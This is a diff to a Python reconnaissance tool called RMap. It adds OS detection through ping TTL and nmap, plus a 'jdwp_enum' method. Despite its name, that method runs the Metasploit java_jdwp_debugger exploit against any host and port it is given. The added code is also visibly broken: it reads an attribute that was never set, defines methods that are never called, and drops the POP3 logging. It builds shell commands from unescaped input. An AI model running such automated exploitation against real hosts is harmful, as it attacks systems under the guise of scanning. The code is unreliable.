@@ -1,4 +1,4 @@
-from rmap.utils import exec_cmd, exec_cmd_bash, rmap_print_cmd
+from rmap.utils import exec_cmd, exec_cmd_bash, rmap_print_cmd, rmap_print_msg, get_ping_ttl
 from colorama import Fore
 from time import sleep
 import logging
@@ -19,8 +19,27 @@ class RMap:
         self.debug = debug
         self.processes_limit = processes_limit
 
+        self.os_detected
+
         exec_cmd(f"mkdir -p {outdir}")
         self.nmap()
+
+    def os_detect(self):
+        ttl_result = get_ping_ttl(self.host)
+
+        # Linux
+        if ttl_result == 64:
+            self.os_detected = "Linux"
+        elif ttl_result == 128:
+            self.os_detected = "Windows"
+        else:
+            rmap_print_msg("OS DETECTION", "STATUS", "Ping TTL didn't match Linux or Windows. Running Nmap OS detection...")
+    
+
+    def nmap_os_detect(self):
+        nmapcmd = f'''nmap --top-ports 20 -O -oG - {self.host} | awk \'{for (I=1;I<NF;I++) if ($I == \"OS:\") printf $(I+1) \" \" $(I+2)}\' '''
+        rmap_print_msg("OS DETECTION", "EXEC", nmapcmd)
+        nmapresult = exec_cmd_bash(f"{nmapcmd}")
         
     def nmap(self):
         exec_cmd(f"mkdir -p {outdir}/nmap")
@@ -276,6 +295,17 @@ class RMap:
         rmap_print_cmd("POP3", port, pop3nmap)
         exec_cmd(pop3nmap)
 
+    def jdwp_enum(self, port):
+        with semaphore:
+            sleep(1)
+
+        exec_cmd(f"mkdir -p {outdir}/jdwp")
+        resultout = f"jdwp_{self.host}:{port}"
+        msfcmd = f"msfconsole -n -q -x \"use exploit/multi/misc/java_jdwp_debugger;set RHOSTS {self.host};set RPORT {port};run;exit\""
+
+        rmap_print_cmd("JDWP", port, msfcmd)
+        exec_cmd_bash(f"{msfcmd} > {outdir}/jdwp/{resultout}")
+
         if self.debug:
-            logging.debug(f'[POP3 ENDED] {pop3nmap}')        
+            logging.debug(f'[JDWP ENDED] {msfcmd}')        
 
